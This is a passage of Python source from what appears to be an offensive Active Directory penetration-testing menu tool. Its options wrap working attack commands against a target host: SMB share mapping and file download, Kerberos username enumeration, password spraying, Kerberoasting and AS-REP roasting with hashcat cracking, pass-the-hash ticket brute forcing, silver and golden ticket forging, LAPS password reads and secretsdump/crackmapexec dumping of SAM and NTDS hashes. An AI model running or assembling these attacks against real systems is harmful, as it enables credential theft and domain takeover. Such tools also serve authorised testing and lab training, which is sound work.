            cutLine("NT_STATUS_ACCOUNT_DISABLED","shares2.tmp")
            cutLine("NT_STATUS_CONNECTION_RESET","shares2.tmp")
            cutLine("Reconnecting with SMB1","shares2.tmp")
            cutLine("Sharename","shares2.tmp")
            cutLine("---------","shares2.tmp")
            cutLine("^$","shares2.tmp")
            remoteCOM("sed -i 's/^[ \t]*//' shares2.tmp")
            remoteCOM("mv shares2.tmp " + dataDir + "/shares.txt")
         with open(dataDir + "/shares.txt", "r") as shares:
            for x in range(0, maxUser):
                SHAR[x] = shares.readline().rstrip(" ")
                SHAR[x] = spacePadding(SHAR[x], COL2)
         with open("shares1.tmp","r") as check:
            if "READ, WRITE" in check.read():
               print(colored("[*] A remote SMB READ/WRITE directory has been identified, checking for possible CVE-2017-7494 exploit - please wait...\n", colour3))
               remoteCOM("nmap --script smb-vuln-cve-2017-7494 --script-args smb-vuln-cve-2017-7494.check-version -p445 " + TIP.rstrip(" ") + " > exploit.tmp")
               cutLine("Starting Nmap", "exploit.tmp")
               cutLine("Nmap scan report", "exploit.tmp")
               cutLine("Host is up", "exploit.tmp")
               cutLine("Nmap done","exploit.tmp")
               parsFile("exploit.tmp")
               catsFile("exploit.tmp")
      else:
         print("[+] Unable to obtains shares...")
      prompt()      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - smbmap -u USER -p PASSWORD -d DOMAIN -H IP -R sharename
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '48':
      checkParam = test_TIP()      
      if checkParam != 1:
         checkParam = test_DOM()                   
      if IP46 == "-6":
         print(colored("[!] WARNING!!! - Not compatable with IP 6...",colour0))		# IT MIGHT BE POSSIBLE TO USE DOMAIN NAME BUT NEED REWRITE!!
         checkParam = 1       
      if checkParam != 1:
         checkParam = test_TSH()             
      if checkParam != 1:
         if NTM[:5] != "EMPTY":
            print("[i] Using HASH value as password credential...")
            print(colored("[*] Checking OS...", colour3))
            remoteCOM("smbmap -v --admin -u " + USR.rstrip(" ") + "%:'" + NTM.rstrip(" ") + "' -d " + DOM.rstrip(" ") + " -H " + TIP.rstrip(" ") + " -R " + TSH.rstrip(" "))      
            print(colored("[*] Checking command privilege...", colour3))
            remoteCOM("smbmap -x whoami -u " + USR.rstrip(" ") + "%:'" + NTM.rstrip(" ") + "' -d " + DOM.rstrip(" ") + " -H " + TIP.rstrip(" ") + " -R " + TSH.rstrip(" "))      
            print(colored("[*] Mapping Shares...", colour3))
            remoteCOM("smbmap -u " + USR.rstrip(" ") + "%:'" + NTM.rstrip(" ") + "' -d " + DOM.rstrip(" ") + " -H " + TIP.rstrip(" ")  + " -R " + TSH.rstrip(" ") + " --depth 15")      
         else:
            print(colored("[*] Checking OS...", colour3))
            remoteCOM("smbmap -v --admin -u " + USR.rstrip(" ") + "%'" + PAS.rstrip(" ") + "' -d " + DOM.rstrip(" ") + " -H " + TIP.rstrip(" ") + " -R " + TSH.rstrip(" "))
            print(colored("[*] Checking command privilege...", colour3))
            remoteCOM("smbmap -x whoami -u " + USR.rstrip(" ") + "%'" + PAS.rstrip(" ") + "' -d " + DOM.rstrip(" ") + " -H " + TIP.rstrip(" ") + " -R " + TSH.rstrip(" "))         
            print(colored("[*] Mapping Shares...", colour3))
            remoteCOM("smbmap -u " + USR.rstrip(" ") + "%'" + PAS.rstrip(" ") + "' -d " + DOM.rstrip(" ") + " -H " + TIP.rstrip(" ")  + " -R " + TSH.rstrip(" ") + " --depth 15 > mapped.tmp")            
            cutLine("[+]","mapped.tmp")
            parsFile("mapped.tmp")
            catsFile("mapped.tmp")
      prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - smbmap -u USER -p PASSWORD -d DOMAIN -H IP -R sharename
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '49':
      checkParama = test_TIP()
      if checkParam != 1:
         checkParam = test_DOM()             
      if checkParam != 1:
         exTensions = fileExt.replace(",","|")
         exTensions = "'(" + exTensions + ")'"                           
         if IP46 == "-6":
            print(colored("[!] WARNING!!! - Not compatable with IP 6...", colour0)) 
            checkParam = 1            
      if checkParam != 1:
         checkParam = test_TSH()                  
      if checkParam != 1:
         if NTM[:5] != "EMPTY":
            print("[i] Using HASH value as password credential...")
            print("[+] Downloading any found files...")
            remoteCOM("smbmap -u " + USR.rstrip(" ") + "%:'" + NTM.rstrip(" ") + "' -d " + DOM.rstrip(" ") + " -H " + TIP.rstrip(" ") + " -A " + exTensions + " -R " + TSH.rstrip(" ") + " --depth 15")
         else:
            print("[+] Downloading any found files...")
            remoteCOM("smbmap -u " + USR.rstrip(" ") + "%'" + PAS.rstrip(" ") + "' -d " + DOM.rstrip(" ") + " -H " + TIP.rstrip(" ") + " -A " + exTensions + " -R " + TSH.rstrip(" ") + " --depth 15") 
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - smbclient \\\\IP\\SHARE -U USER%PASSWORD.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '50':
      checkParam = test_TIP()           
      if checkParam != 1:
         checkParam = test_TSH()                  
      if checkParam != 1:
         if NTM[:5] != "EMPTY":
            print("[i] Using HASH value as password credential...")
            remoteCOM("smbclient \\\\\\\\" + TIP.rstrip(" ") + "\\\\" + TSH.rstrip(" ") + " -U " + USR.rstrip(" ") + "%:'" + NTM.rstrip(" ") + "' --pw-nt-hash -s " + TSH.rstrip(" " ))
         else:
            remoteCOM("smbclient \\\\\\\\" + TIP.rstrip(" ") + "\\\\" + TSH.rstrip(" ") + " -U " + USR.rstrip(" ") + "%'" + PAS.rstrip(" ") + "' -s " + TSH.rstrip(" "))
      prompt()
   
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - GetADUsers.py DOMAIN/USER:PASSWORD.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '51':
      checkParam = test_TIP()      
      if checkParam != 1:
         checkParam = test_DOM()               
      if checkParam != 1:
         if NTM[:5] != "EMPTY":
            print("[i] Using HASH value as password credential...")
            remoteCOM(keyPath + "GetADUsers.py -all " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + " -hashes :" + NTM.rstrip(" ") +" -dc-ip "  + TIP.rstrip(" "))
         else:
            remoteCOM(keyPath + "GetADUsers.py -all " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") +" -dc-ip "  + TIP.rstrip(" "))
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - nmap -p 88 --script=krb-enum-users --script-args krb-enum-users.realm=DOMAIN,userdb=usernames.txt IP.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '52':
      checkParam = test_TIP()      
      if checkParam != 1:
         checkParam = test_DOM()               
      if checkParam != 1:
         checkParam = test_PRT("88")               
      if checkParam != 1:
         print(colored("[*] Enumerating remote server for valid usernames, please wait...", colour3))
         remoteCOM("nmap " + IP46 + " -p 88 --script=krb5-enum-users --script-args=krb5-enum-users.realm=\'" + DOM.rstrip(" ") + ", userdb=" + dataDir + "/usernames.txt\' " + TIP.rstrip(" ") + " >> users.tmp")
         localCOM("sed -i '/@/!d' users.tmp")							# PARSE FILE 1
         localCOM("sort -r users.tmp > sortedusers.tmp")                  
         with open("sortedusers.tmp", "r") as read, open("validusers.tmp", "w") as parse:	# PARSE FILE 2
            for username in read:
               username = username.replace("|     ","")
               username = username.replace("|_    ","")
               username, null = username.split("@")
               if username != "":
                  parse.write(username + "\n")                  
         count = lineCount("validusers.tmp")         
         if count > 0:
            print("[+] Found valid usernames...\n")                                         
            with open("validusers.tmp", "r") as read:
               for loop in range(0, count):
                  checkname = read.readline().rstrip("\n")
                  checkname = spacePadding(checkname, COL3)               
                  for x in range(0, maxUser):
                     if checkname == USER[x]:
                        print(colored((USER[x]), colour6))
                        VALD[x] = "1"
                        USER.insert(0, USER.pop(x))
                        HASH.insert(0, HASH.pop(x))
                        VALD.insert(0, VALD.pop(x))
                        break                        
                  for x in range(0, maxUser):
                     if (USER[x][:1] != " ") and (HASH[x][:1] == " "):
                        HASH[x] = "."*COL4                        
            with open(dataDir + "/usernames.txt", "w") as write1, open(dataDir + "/hashes.txt", "w") as write2, open(dataDir + "/tokens.txt", "w") as write3:            
               for x in range(0, maxUser):
                  if USER[x][:1] != " ":
                     write1.write(USER[x].rstrip(" ") + "\n")
                     write2.write(HASH[x].rstrip(" ") + "\n")
                     write3.write(VALD[x].rstrip(" ") + "\n")
         else:
            print("[-] No valid usernames were found...")
      prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - kerbrute.py -domain DOMAIN -users usernames.txt -passwords passwords.txt -outputfile optional.txt.
# Modified: NOTE - THIS DOES NOT CURRENTLY DEAL WITH FOUND MULTIPLE USERS!!!
# -------------------------------------------------------------------------------------

   if selection =='53':
      checkParam = test_TIP()
      found = 0            
      if checkParam != 1:
         checkParam = test_DOM()
      if checkParam != 1:
         print(colored("[*] Trying all usernames with password " + PAS.rstrip(" ") + " first...", colour3))
         remoteCOM("kerbrute -dc-ip " + TIP.rstrip(" ") + " -domain " + DOM.rstrip(" ") + " -users " + dataDir + "/usernames.txt -password '" + PAS.rstrip(" ") + "' -outputfile password1.tmp")
         test1 = linecache.getline("password1.tmp", 1)               
         if test1 != "":
            found = 1
            USR,PAS = test1.split(":")
            USR = spacePadding(USR, COL1)
            PAS = spacePadding(PAS, COL1)
            TGT = privCheck()                         
         if found == 0:
            print(colored("\n[*] Now trying all usernames with matching passwords...",colour3))
            remoteCOM("kerbrute -dc-ip " + TIP.rstrip(" ") + " -domain " + DOM.rstrip(" ") + " -users " + dataDir + "/usernames.txt -passwords " + dataDir + "/usernames.txt -outputfile password2.tmp")
            test2 = linecache.getline("password2.tmp", 1)                        
            if test2 != "":
               found = 1
               USR,PAS = test2.split(":")
               USR = spacePadding(USR, COL1)
               PAS = spacePadding(PAS, COL1)
               TGT = privCheck()                              
         if found == 0:
            print(colored("\n[*] Now trying all users against password list, please wait as this could take sometime...",colour3))            
            remoteCOM("kerbrute -dc-ip " + TIP.rstrip(" ") + " -domain " + DOM.rstrip(" ") + " -users " + dataDir + "/usernames.txt -passwords " + dataDir + "/passwords.txt -outputfile password3.tmp")                 
            test3 = linecache.getline("password3.tmp", 1)                       
            if test3 != "":
               USR,PAS = test3.split(":") 
               USR = spacePadding(USR, COL1)
               PAS = spacePadding(PAS, COL1)
               TGT = privCheck()               
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected -  GetUserSPNs.py DOMAIN/USER:PASSWORD -outputfile hashroast1.txt
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '54':
      checkParam = test_TIP()      
      if checkParam != 1:
         checkParam = test_DOM()                     
      if checkParam != 1:
         if NTM[:5] != "EMPTY":
            print("[i] Using HASH value as password credential...")
            remoteCOM(keyPath + "GetUserSPNs.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + " -hashes :" + NTM.rstrip(" ") +" -outputfile hashroast1.tmp")
         else:
            remoteCOM(keyPath + "GetUserSPNs.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") +" -outputfile hashroast1.tmp")                          
         print(colored("[*] Cracking hash values if they exists...\n", colour3))
         localCOM("hashcat -m 13100 --force -a 0 hashroast1.tmp /usr/share/wordlists/rockyou.txt -o cracked1.txt")
         localCOM("strings cracked1.txt")
      else:
         print("[+] The file usernames.txt is empty...")         
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - GetNPUsers.py DOMAIN/ -usersfile usernames.txt -format hashcat -outputfile hashroast2.txt
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='55':
      checkParam = test_TIP()      
      if checkParam != 1:
         checkParam = test_DOM()          
      if checkParam != 1:      
         localCOM("touch authorised.tmp")         
         with open(dataDir + "/usernames.txt", "r") as read:
            for x in range(0, maxUser):
               line = read.readline().rstrip("\n")
               if VALD[x] == "1":
                  localCOM("echo " + line + " >> authorised.tmp")                        
         count = lineCount("authorised.tmp")                       
         if count > 0:           
            with open(dataDir + "/usernames.txt", "r") as read:
               for x in range(0, maxUser):
                  line = read.readline().rstrip("\n")
                  localCOM("echo " + line + " >> authorised.tmp")      
         else:
            print("[+] The authorised user file seems to be empty, so I am authorising everyone in the list..")                     
         if checkParam != 1:
            if NTM[:5] != "EMPTY":
               print("[i] Using HASH value as password credential...")
               remoteCOM(keyPath + "GetNPUsers.py -outputfile hashroast2.tmp -format hashcat " + DOM.rstrip(" ") + "/ -usersfile authorised.tmp")
            else:
               remoteCOM(keyPath + "GetNPUsers.py -outputfile hashroast2.tmp -format hashcat " + DOM.rstrip(" ") + "/ -usersfile authorised.tmp")                        
            print(colored("[*] Cracking hash values if they exists...\n", colour3))
            localCOM("hashcat -m 18200 --force -a 0 hashroast2.tmp /usr/share/wordlists/rockyou.txt -o cracked2.txt")
            localCOM("strings cracked2.txt")         
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - print binascii.hexlify(hashlib.new("md4", "<password>".encode("utf-16le")).digest())'
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '56':
      checkParam = test_PAS()
      if checkParam != 1:    
         NTM = hashlib.new("md4", PAS.rstrip(" ").encode("utf-16le")).digest()
         NTM = binascii.hexlify(NTM)
         NTM = str(NTM)
         NTM = NTM.lstrip("b'")
         NTM = NTM.rstrip("'")                
         for x in range(0, maxUser):
            if USER[x].rstrip(" ") == USR.rstrip(" "):
               HASH[x] = NTM.rstrip(" ")
         print("[+] Created hash value " + NTM + "...")
         NTM = spacePadding(NTM, COL1)
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - getTGT.py DOMAIN/USER:PASSWORD
# Details :                        getTGT.py DOMAIN/USER -hashes :HASH
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '57':
      checkParam = test_TIP()      
      if checkParam != 1:
         checkParam = test_DOM()                             
      if USR[:2] == "''":
         print("[-] Please enter a valid username for enumeration...")
         checkParam = 1              
      if checkParam != 1:       
         count = lineCount(dataDir + "/hashes.txt")         
         counter = 0                  
         if count > 12:
            marker = int(round(count/4))
         else:
            marker = 0
         marker1 = marker
         marker2 = marker * 2
         marker3 = marker * 3                                       
         if count > 0:
            print("[+] Please wait, bruteforcing remote server using " + str(count) + " hashes...")                        
            with open(dataDir + "/hashes.txt", "r") as force:
               for brute in force:
                  brute = brute.rstrip("\n")                               
                  remoteCOM(keyPath + "getTGT.py " + DOM.rstrip(" ") +  "/" + USR.rstrip(" ") + " -hashes :" + brute + " -dc-ip " + TIP.rstrip(" ") + " > datalog.tmp")
                  counter = counter + 1
                  localCOM("sed -i '1d' datalog.tmp")
                  localCOM("sed -i '1d' datalog.tmp")                                 
                  with open("datalog.tmp", "r") as ticket:
                     checkFile = ticket.read()                                           
                  if "[*] Saving ticket" in checkFile:
                     print("[+] Ticket successfully generated for " + USR.rstrip(" ") + " using hash substitute " + str(USER[counter]).rstrip(" ") + ":" + brute + "...")                    
                     TGT = privCheck()                         
                     NTM = spacePadding(brute, COL1)
                     checkParam = 2
                     break                                                               
                  if "Clock skew too great" in checkFile:
                     print("[-] Clock skew too great, terminating...")
                     checkParam = 2
                     break                                                               
                  if marker1 == counter:
                     print("[i] 25% completed...")                                          
                  if marker2 == counter:
                     print("[i] 50% completed...")                                          
                  if marker3 == counter:
                     print("[i] 75% completed...")                                              
            if checkParam != 2:
               print("[-] 100% complete - exhausted!!...")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - Overpass the HASH/pass the key 
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '58':
      checkParam = test_TIP()      
      if checkParam != 1:
         checkParam = test_DOM()               
      if checkParam != 1:
         print(colored("[*] Trying to create TGT for user " + USR.rstrip(" ") + "...", colour3))                  
         if (NTM[:1] != ""):
            print("[i] Using HASH value as password credential...")
            remoteCOM(keyPath + "getTGT.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + " -hashes :" + NTM.rstrip(" "))                        
            if os.path.exists(USR.rstrip(" ") + ".ccache"):
               print("[+] Checking TGT status...")
               TGT = privCheck()
         else:
            print("[+] TGT was not generated...")                              
      prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - kinit j.nakazawa@REALCORP.HTB.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='59':
      checkParam = test_TIP()
      if checkParam != 1:
         checkParam = test_DOM()
      if checkParam != 1:
         checkParam = test_USR()
      if checkParam != 1:
         krb5 = input("[?] Please enter default realm :")
         print(colored("[*] Attempting to create kerberus ticket for user " + USR.rstrip(" ") + "@" + krb5.rstrip("\n") + "...", colour3))
         localCOM("mv /etc/krb5.conf /etc/krb5.conf.bak")
         localCOM("echo '[libdefaults]' > /etc/krb5.conf")
         localCOM("echo '	default_realm = " + krb5.rstrip("\n") + "' >> /etc/krb5.conf")
         localCOM("echo '[realms]' >> /etc/krb5.conf")
         localCOM("echo '\t\t" + krb5.rstrip("\n") + " = {' >> /etc/krb5.conf")
         localCOM("echo '\t\t\tkdc = " + TIP.rstrip(" ") + "' >> /etc/krb5.conf")
         localCOM("echo '\t\t\t}' >> /etc/krb5.conf\n")
         localCOM("kinit " + USR.rstrip(" "))
         localCOM("klist")
         localCOM("rm /etc/krb5.conf")
         localCOM("mv /etc/krb5.conf.bak /etc/krb5.conf")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - ticketer.py -nthash HASH -domain-sid DOMAIN-SID -domain DOMAIN -spn cifs/COVID-3
# Details : Silver Ticket!! 
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '60':
      checkParam = test_TIP()     
      if checkParam != 1:
         checkParam = test_DOM()         
      if checkParam != 1:
         checkParam = test_USR()         
      if checkParam != 1:
         print(colored("[*] Trying to create silver TGT for user " + USR.rstrip(" ") + "...", colour3))                  
         if (NTM[:1] != "") & (SID[:1] != ""):
            print("[i] Using HASH value as password credential...")
            remoteCOM(keyPath + "ticketer.py -nthash :" + NTM.rstrip("\n") + " -domain-sid " + SID.rstrip("\n") + " -domain " + DOM.rstrip(" ") + " -spn CIFS/DESKTOP-01." + DOM.rstrip(" ") + " " + USR.rstrip(" "))            
         if os.path.exists(USR.rstrip(" ") + ".ccache"):
            print("[+] Checking silver TGT status...")
            TGT = privCheck()
         else:
             print("[+] Silver TGT was not generated...")                   
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - GOLDEN TICKET ticketer.py -nthash HASH -domain-sid DOMAIN SID -domain DOMAIN USER
# Details : Golden Ticket!!
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '61':
      checkParam = test_TIP()      
      if checkParam != 1:
         checkParam = test_DOM()         
      if checkParam != 1:
         checkParam = test_USR()         
      if checkParam != 1:
         print(colored("[*] Trying to create golden TGT for user " + USR.rstrip(" ") + "...", colour3))         
         
         if (NTM[:1] != "") & (SID[:1] != ""):
            print("[i] Using HASH value as password credential...")
            remoteCOM(keyPath + "ticketer.py -nthash :" + NTM.rstrip("\n") + " -domain-sid " + SID.rstrip("\n") + " -domain " + DOM.rstrip(" ") + " " + USR.rstrip(" "))                        
         if os.path.exists(USR.rstrip(" ") + ".ccache"):
            print("[+] Checking gold TGT status...")
            TGT = privCheck()
         else:
            print("[+] Golden TGT was not generated...")            
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - goldenpac.py -dc-ip IP -target-ip IP DOMAIN/USER:PASSWORD@DOMAIN
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='62':
      checkParam = test_TIP()      
      if checkParam != 1:
         checkParam = test_DOM()               
      if checkParam != 1:
         if NTM[:5] != "EMPTY":
            print("[i] Using HASH value as password credential...")
            remoteCOM(keyPath + "goldenPac.py -dc-ip " + TIP.rstrip(" ") + " -target-ip " + TIP.rstrip(" ") + " " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + "@" + DOM.rstrip(" ") + " -hashes :" + NTM.rstrip(" "))
         else:
            remoteCOM(keyPath + "goldenPac.py -dc-ip " + TIP.rstrip(" ") + " -target-ip " + TIP.rstrip(" ") + " " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") +"@" + DOM.rstrip(" "))
      prompt() 
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - ldapdomaindump
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='63':
      checkParam = test_TIP()      
      if checkParam != 1:
         checkParam = test_DOM()               
      if checkParam != 1:
         if NTM[:5] != "EMPTY":
            print("[i] Using HASH value as password credential...")
            remoteCOM("ldapdomaindump -u '" + DOM.rstrip(" ") + '\\' + USR.rstrip(" ") + "' -p :" + NTM.rstrip(" ") +" " + TIP.rstrip(" ") + " -o " + workDir)
         else:
            remoteCOM("ldapdomaindump -u '" + DOM.rstrip(" ") + '\\' + USR.rstrip(" ") + "' -p '" + PAS.rstrip(" ") +"' " + TIP.rstrip(" ") + " -o " + workDir)                     
         print(colored("[*] Checking downloaded files...\n", colour3))
         localCOM("ls -la ./" + workDir + "/*.*")
      prompt()     
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - Bloodhound-python -d DOMAIN -u USER -p PASSWORD
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='64':
      checkParam = test_TIP()      
      if checkParam != 1:
         checkParam = test_DOM()                     
      if checkParam != 1:
         print ("[*] Enumerating, please wait...\n")                       
         if PAS[:2] != "''":
            remoteCOM("bloodhound-python -d " + DOM.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -c all -ns " + TIP.rstrip(" "))
         else:
            if NTM[:5].upper() != "EMPTY":
               print("[i] Using HASH value as password credential...")
               remoteCOM("bloodhound-python -d " + DOM.rstrip(" ") + " -u " + USR.rstrip(" ") + " --hashes " + NTM.rstrip(" ") + " -c all -ns " + TIP.rstrip(" "))            
            else:
               print("[-] Both, password and ntlm hash values are invalid...")
      print("\n[*] Checking downloaded files...\n")
      localCOM("mv *.json ./" + workDir)
      localCOM("ls -la ./" + workDir + "/*.*")            
      prompt()
         
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - aclpwn - du neo4j password -f USER - d DOMAIN -sp PASSWORD -s IP.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='65':
      checkParam != test_TIP()      
      if checkParam != 1:
         checkParam = test_DOM()  
      if checkParam != 1:
         s = Server(DOM.rstrip(" "), get_info=ALL) 
         c = Connection(s, user=DOM.rstrip(" ") + "\\" + USR.rstrip(" "), password=PAS.rstrip(" "), authentication=NTLM, auto_bind=True)       
         c.search(search_base=base_creator(DOM.strip(" ")), search_filter='(&(objectCategory=computer)(ms-MCS-AdmPwd=*))',attributes=['ms-MCS-AdmPwd','ms-Mcs-AdmPwdExpirationTime','cn'])
         for entry in c.entries:
            output = str(entry['cn']) +" "+ str(entry['ms-Mcs-AdmPwd'])
            print(colored("\n" + output, colour6))

# OLD ACL PWN CODE      
#         BH1 = input("[+] Enter Neo4j username: ")
#         BH2 = input("[+] Enter Neo4j password: ")                  
#         if BH1 != "" and BH2 != "":
#            runCommand("aclpwn -du " + BH1 + " -dp " + BH2 + " -f " + USR.rstrip(" ") + "@" + DOM.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -sp " + PAS.rstrip(" ") + " -s " + TIP.rstrip(" "))
#         else:
#            print("[+] Username or password cannot be null...")            
      prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - secretdump.py DOMAIN/USER:PASSWORD@IP.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='66':
      checkParam = test_TIP()      
      if checkParam != 1:
         checkParam = test_DOM()               
      if checkParam != 1:
         print(colored("[*] Enumerating, please wait...", colour3))         
         if PAS[:2] != "''":
            remoteCOM(keyPath + "secretsdump.py '" + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + "@" + TIP.rstrip(" ") + "' > secrets.tmp")
         else:
            print("[i] Using HASH value as password credential...")
            remoteCOM(keyPath + "secretsdump.py '" + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + "@" + TIP.rstrip(" ") + "' -hashes ':" + NTM.rstrip(" ") + "' > secrets.tmp")                        
         localCOM("sed -i '/:::/!d' secrets.tmp")
         localCOM("sort -u secrets.tmp > ssecrets.tmp")         
         count = lineCount("ssecrets.tmp")               	
         if count > 0:               
            localCOM("rm " + dataDir + "/usernames.txt")
            localCOM("rm " + dataDir + "/hashes.txt")
            wipeTokens(VALD)             
            for x in range(0, count):
               data = linecache.getline("ssecrets.tmp", x + 1)               
               data = data.replace(":::","")               
               try:
                  get1,get2,get3,get4 = data.split(":") 
               except ValueError:
                  try:
                     print(colored("[!] WARNING!!! - Huston, we encountered a problem while unpacking a hash value, but fixed it in situ... just letting you know!!...", colour0))
                     get1, get2, get3 = data.split(":")
                     get4 = get3
                  except:
                     get1 = "Major Error..."
                     get2 = "Major Error..."
                     get3 = "Major Error..."
                     get4 = "Major Error..."                     
               get1 = get1.rstrip("\n")
               get2 = get1.rstrip("\n")
               get3 = get1.rstrip("\n")
               get4 = get4.rstrip("\n")                              
               print(colored("[+] Found User " + get1,colour6))            
               USER[x] = get1[:COL3]
               HASH[x] = get4[:COL4]
               USER[x] = spacePadding(USER[x], COL3)
               HASH[x] = spacePadding(HASH[x], COL4)               
               if USER[x][:1] != " ":
                  localCOM("echo " + USER[x].rstrip(" ") + " >> " + dataDir + "/usernames.txt")
                  localCOM("echo " + HASH[x].rstrip(" ") + " >> " + dataDir + "/hashes.txt")           
         else:      
            print("[+] No users were found. check the domain name is correct...")               
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - crackmapexec smb IP -u Administrator -p password --lusers --local-auth --shares & H hash -x 'net user Administrator /domain'
# Modified: crackmapexec currently (03/01/2021) has a python3 problem - so this is a work around that still does not terminate properly.
# -------------------------------------------------------------------------------------

   if selection =='67':
      checkParam = test_TIP()      
      if checkParam != 1:
         checkParam = test_DOM()               
      if checkParam != 1:      
         if PAS[:2] != "''":
            checkParam = test_PRT("5985")                                    
            if checkParam != 1:
               print("[+] Finding exploitable machines on the same subnet...\n")
               remoteCOM("crackmapexec winrm " + TIP.rstrip(" ") + "/24")                         
            checkParam = test_PRT("445")
            if checkParam != 1:
               print("\n[+] Checking priviliges...\n")
               remoteCOM("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -X whoami")
               print("\n[+] Enumerating users...\n")
               remoteCOM("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' --users")               
               print("\n[+] Enumerating shares...\n")
               remoteCOM("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' --shares")               
               print("\n[+] Enumerating sessions...\n")
               remoteCOM("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' --sessions")               
               print("\n[+] Enumerating SAM...\n")
               remoteCOM("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' --local-auth --sam")               
               print("\n[+] Enumerating NTDS...\n")
               remoteCOM("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' --local-auth --ntds drsuapi")
         else:
            print("[i] Using HASH value as password credential...")
            checkParam = test_PRT("5985")
            if checkParam != 1:
               print("[+] Finding exploitable machines on the same subnet...\n")
